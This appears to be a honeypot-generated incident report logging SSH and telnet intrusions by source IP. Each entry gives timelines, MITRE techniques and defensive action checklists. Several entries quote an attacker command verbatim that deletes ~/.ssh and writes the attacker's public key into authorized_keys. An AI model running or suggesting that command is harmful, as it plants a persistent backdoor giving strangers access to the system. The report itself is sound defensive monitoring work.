| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 19:56 |
| **Last Seen** | 2026-07-03 19:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:56:20` | `cowrie.session.connect` |
| `2026-07-03 19:56:21` | `cowrie.client.version` |
| `2026-07-03 19:56:21` | `cowrie.client.kex` |
| `2026-07-03 19:56:27` | `cowrie.login.success` |
| `2026-07-03 19:56:31` | `cowrie.session.params` |
| `2026-07-03 19:56:31` | `cowrie.command.input` |
| `2026-07-03 19:56:32` | `cowrie.log.closed` |
| `2026-07-03 19:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f913321bbb4a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 19:58 |
| **Last Seen** | 2026-07-03 19:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 19:58:17` | `cowrie.session.connect` |
| `2026-07-03 19:58:17` | `cowrie.client.version` |
| `2026-07-03 19:58:17` | `cowrie.client.kex` |
| `2026-07-03 19:58:17` | `cowrie.login.success` |
| `2026-07-03 19:58:18` | `cowrie.session.params` |
| `2026-07-03 19:58:18` | `cowrie.command.input` |
| `2026-07-03 19:58:18` | `cowrie.log.closed` |
| `2026-07-03 19:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a60797502c7

| Field | Detail |
|---|---|
| **Source IP** | `61.151.249[.]194` |
| **First Seen** | 2026-07-03 20:02 |
| **Last Seen** | 2026-07-03 20:07 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:02:04` | `cowrie.session.connect` |
| `2026-07-03 20:02:04` | `cowrie.client.version` |
| `2026-07-03 20:02:04` | `cowrie.client.kex` |
| `2026-07-03 20:02:05` | `cowrie.login.success` |
| `2026-07-03 20:02:06` | `cowrie.session.params` |
| `2026-07-03 20:02:06` | `cowrie.command.input` |
| `2026-07-03 20:02:06` | `cowrie.command.failed` |
| `2026-07-03 20:07:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.151.249[.]194` to AbuseIPDB if not already reported
- [ ] Block `61.151.249[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-847fb112972d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 20:07 |
| **Last Seen** | 2026-07-03 20:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:07:55` | `cowrie.session.connect` |
| `2026-07-03 20:07:56` | `cowrie.client.version` |
| `2026-07-03 20:07:56` | `cowrie.client.kex` |
| `2026-07-03 20:08:03` | `cowrie.login.success` |
| `2026-07-03 20:08:06` | `cowrie.session.params` |
| `2026-07-03 20:08:06` | `cowrie.command.input` |
| `2026-07-03 20:08:08` | `cowrie.log.closed` |
| `2026-07-03 20:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f68d5af9020

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-03 20:12 |
| **Last Seen** | 2026-07-03 20:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:12:22` | `cowrie.session.connect` |
| `2026-07-03 20:12:22` | `cowrie.client.version` |
| `2026-07-03 20:12:23` | `cowrie.client.kex` |
| `2026-07-03 20:12:23` | `cowrie.login.success` |
| `2026-07-03 20:12:23` | `cowrie.direct-tcpip.request` |
| `2026-07-03 20:12:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-03 20:12:23` | `cowrie.direct-tcpip.data` |
| `2026-07-03 20:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c4ab70ce51

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-03 20:12 |
| **Last Seen** | 2026-07-03 20:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:12:23` | `cowrie.session.connect` |
| `2026-07-03 20:12:23` | `cowrie.client.version` |
| `2026-07-03 20:12:23` | `cowrie.client.kex` |
| `2026-07-03 20:12:24` | `cowrie.login.success` |
| `2026-07-03 20:12:24` | `cowrie.direct-tcpip.request` |
| `2026-07-03 20:12:24` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-03 20:12:24` | `cowrie.direct-tcpip.data` |
| `2026-07-03 20:12:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0eb31b11a2e

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-03 20:19 |
| **Last Seen** | 2026-07-03 20:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:19:16` | `cowrie.session.connect` |
| `2026-07-03 20:19:16` | `cowrie.client.version` |
| `2026-07-03 20:19:16` | `cowrie.client.kex` |
| `2026-07-03 20:19:17` | `cowrie.login.success` |
| `2026-07-03 20:19:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-413da5c15038

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-03 20:19 |
| **Last Seen** | 2026-07-03 20:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:19:17` | `cowrie.session.connect` |
| `2026-07-03 20:19:17` | `cowrie.client.version` |
| `2026-07-03 20:19:17` | `cowrie.client.kex` |
| `2026-07-03 20:19:18` | `cowrie.login.success` |
| `2026-07-03 20:19:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad5b802104cc

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-03 20:19 |
| **Last Seen** | 2026-07-03 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:19:18` | `cowrie.session.connect` |
| `2026-07-03 20:19:18` | `cowrie.client.version` |
| `2026-07-03 20:19:18` | `cowrie.client.kex` |
| `2026-07-03 20:19:19` | `cowrie.login.success` |
| `2026-07-03 20:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9569882b3631

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-07-03 20:19 |
| **Last Seen** | 2026-07-03 20:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:19:19` | `cowrie.session.connect` |
| `2026-07-03 20:19:19` | `cowrie.client.version` |
| `2026-07-03 20:19:20` | `cowrie.client.kex` |
| `2026-07-03 20:19:20` | `cowrie.login.success` |
| `2026-07-03 20:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a41cc586d58

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 20:19 |
| **Last Seen** | 2026-07-03 20:19 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:19:30` | `cowrie.session.connect` |
| `2026-07-03 20:19:31` | `cowrie.client.version` |
| `2026-07-03 20:19:31` | `cowrie.client.kex` |
| `2026-07-03 20:19:37` | `cowrie.login.success` |
| `2026-07-03 20:19:40` | `cowrie.session.params` |
| `2026-07-03 20:19:40` | `cowrie.command.input` |
| `2026-07-03 20:19:42` | `cowrie.log.closed` |
| `2026-07-03 20:19:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec61ccbd0945

| Field | Detail |
|---|---|
| **Source IP** | `14.55.144[.]22` |
| **First Seen** | 2026-07-03 20:21 |
| **Last Seen** | 2026-07-03 20:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:21:48` | `cowrie.session.connect` |
| `2026-07-03 20:21:48` | `cowrie.client.version` |
| `2026-07-03 20:21:49` | `cowrie.client.kex` |
| `2026-07-03 20:21:49` | `cowrie.login.success` |
| `2026-07-03 20:21:50` | `cowrie.session.params` |
| `2026-07-03 20:21:50` | `cowrie.command.input` |
| `2026-07-03 20:21:50` | `cowrie.command.failed` |
| `2026-07-03 20:21:51` | `cowrie.log.closed` |
| `2026-07-03 20:21:52` | `cowrie.session.params` |
| `2026-07-03 20:21:52` | `cowrie.command.input` |
| `2026-07-03 20:21:52` | `cowrie.session.file_download` |
| `2026-07-03 20:21:52` | `cowrie.log.closed` |
| `2026-07-03 20:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.55.144[.]22` to AbuseIPDB if not already reported
- [ ] Block `14.55.144[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dab8d8a33a7e

| Field | Detail |
|---|---|
| **Source IP** | `14.55.144[.]22` |
| **First Seen** | 2026-07-03 20:21 |
| **Last Seen** | 2026-07-03 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:21:52` | `cowrie.session.connect` |
| `2026-07-03 20:21:52` | `cowrie.client.version` |
| `2026-07-03 20:21:52` | `cowrie.client.kex` |
| `2026-07-03 20:21:53` | `cowrie.login.success` |
| `2026-07-03 20:21:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.55.144[.]22` to AbuseIPDB if not already reported
- [ ] Block `14.55.144[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23fd52424ee

| Field | Detail |
|---|---|
| **Source IP** | `14.55.144[.]22` |
| **First Seen** | 2026-07-03 20:21 |
| **Last Seen** | 2026-07-03 20:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:21:53` | `cowrie.session.connect` |
| `2026-07-03 20:21:53` | `cowrie.client.version` |
| `2026-07-03 20:21:54` | `cowrie.client.kex` |
| `2026-07-03 20:21:54` | `cowrie.login.success` |
| `2026-07-03 20:21:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.55.144[.]22` to AbuseIPDB if not already reported
- [ ] Block `14.55.144[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-018d95915f2a

| Field | Detail |
|---|---|
| **Source IP** | `202.183.141[.]133` |
| **First Seen** | 2026-07-03 20:29 |
| **Last Seen** | 2026-07-03 20:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:29:57` | `cowrie.session.connect` |
| `2026-07-03 20:29:59` | `cowrie.telnet.option` |
| `2026-07-03 20:30:00` | `cowrie.telnet.option` |
| `2026-07-03 20:31:02` | `cowrie.login.success` |
| `2026-07-03 20:31:03` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `202.183.141[.]133` to AbuseIPDB if not already reported
- [ ] Block `202.183.141[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36e51bb86899

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 20:31 |
| **Last Seen** | 2026-07-03 20:31 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:31:07` | `cowrie.session.connect` |
| `2026-07-03 20:31:09` | `cowrie.client.version` |
| `2026-07-03 20:31:09` | `cowrie.client.kex` |
| `2026-07-03 20:31:14` | `cowrie.login.success` |
| `2026-07-03 20:31:18` | `cowrie.session.params` |
| `2026-07-03 20:31:18` | `cowrie.command.input` |
| `2026-07-03 20:31:20` | `cowrie.log.closed` |
| `2026-07-03 20:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8559d08b9524

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-03 20:34 |
| **Last Seen** | 2026-07-03 20:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:34:54` | `cowrie.session.connect` |
| `2026-07-03 20:34:54` | `cowrie.client.version` |
| `2026-07-03 20:34:54` | `cowrie.client.kex` |
| `2026-07-03 20:34:55` | `cowrie.login.success` |
| `2026-07-03 20:34:56` | `cowrie.session.params` |
| `2026-07-03 20:34:56` | `cowrie.command.input` |
| `2026-07-03 20:34:56` | `cowrie.log.closed` |
| `2026-07-03 20:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-453c20f856bb

| Field | Detail |
|---|---|
| **Source IP** | `150.109.254[.]122` |
| **First Seen** | 2026-07-03 20:36 |
| **Last Seen** | 2026-07-03 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:36:30` | `cowrie.session.connect` |
| `2026-07-03 20:36:30` | `cowrie.client.version` |
| `2026-07-03 20:36:31` | `cowrie.client.kex` |
| `2026-07-03 20:36:32` | `cowrie.login.success` |
| `2026-07-03 20:36:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.109.254[.]122` to AbuseIPDB if not already reported
- [ ] Block `150.109.254[.]122` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ff31691d7ec

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-03 20:36 |
| **Last Seen** | 2026-07-03 20:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:36:32` | `cowrie.session.connect` |
| `2026-07-03 20:36:32` | `cowrie.client.version` |
| `2026-07-03 20:36:32` | `cowrie.client.kex` |
| `2026-07-03 20:36:33` | `cowrie.login.success` |
| `2026-07-03 20:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27e4c904138e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-03 20:38 |
| **Last Seen** | 2026-07-03 20:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:38:00` | `cowrie.session.connect` |
| `2026-07-03 20:38:00` | `cowrie.client.version` |
| `2026-07-03 20:38:00` | `cowrie.client.kex` |
| `2026-07-03 20:38:01` | `cowrie.login.success` |
| `2026-07-03 20:38:01` | `cowrie.direct-tcpip.request` |
| `2026-07-03 20:38:01` | `cowrie.direct-tcpip.data` |
| `2026-07-03 20:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c891482216

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-03 20:42 |
| **Last Seen** | 2026-07-03 20:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:42:40` | `cowrie.session.connect` |
| `2026-07-03 20:42:41` | `cowrie.client.version` |
| `2026-07-03 20:42:41` | `cowrie.client.kex` |
| `2026-07-03 20:42:47` | `cowrie.login.success` |
| `2026-07-03 20:42:51` | `cowrie.session.params` |
| `2026-07-03 20:42:51` | `cowrie.command.input` |
| `2026-07-03 20:42:52` | `cowrie.log.closed` |
| `2026-07-03 20:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def6c90b16b3

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-07-03 20:46 |
| **Last Seen** | 2026-07-03 20:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:46:08` | `cowrie.session.connect` |
| `2026-07-03 20:46:08` | `cowrie.client.version` |
| `2026-07-03 20:46:08` | `cowrie.client.kex` |
| `2026-07-03 20:46:09` | `cowrie.login.success` |
| `2026-07-03 20:46:10` | `cowrie.session.params` |
| `2026-07-03 20:46:10` | `cowrie.command.input` |
| `2026-07-03 20:46:10` | `cowrie.command.failed` |
| `2026-07-03 20:46:10` | `cowrie.log.closed` |
| `2026-07-03 20:46:11` | `cowrie.session.params` |
| `2026-07-03 20:46:11` | `cowrie.command.input` |
| `2026-07-03 20:46:11` | `cowrie.session.file_download` |
| `2026-07-03 20:46:11` | `cowrie.log.closed` |
| `2026-07-03 20:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deb4cf9ab9bc

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-07-03 20:46 |
| **Last Seen** | 2026-07-03 20:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:46:11` | `cowrie.session.connect` |
| `2026-07-03 20:46:11` | `cowrie.client.version` |
| `2026-07-03 20:46:11` | `cowrie.client.kex` |
| `2026-07-03 20:46:12` | `cowrie.login.success` |
| `2026-07-03 20:46:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-802514eca75f

| Field | Detail |
|---|---|
| **Source IP** | `187.94.255[.]130` |
| **First Seen** | 2026-07-03 20:46 |
| **Last Seen** | 2026-07-03 20:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-03 20:46:12` | `cowrie.session.connect` |
| `2026-07-03 20:46:12` | `cowrie.client.version` |
| `2026-07-03 20:46:12` | `cowrie.client.kex` |
| `2026-07-03 20:46:13` | `cowrie.login.success` |
| `2026-07-03 20:46:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.94.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `187.94.255[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-675cb1925e07

| Field | Detail |
|---|---|
| **Source IP** | `103.243.27[.]155` |
| **First Seen** | 2026-07-03 20:48 |
| **Last Seen** | 2026-07-03 20:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
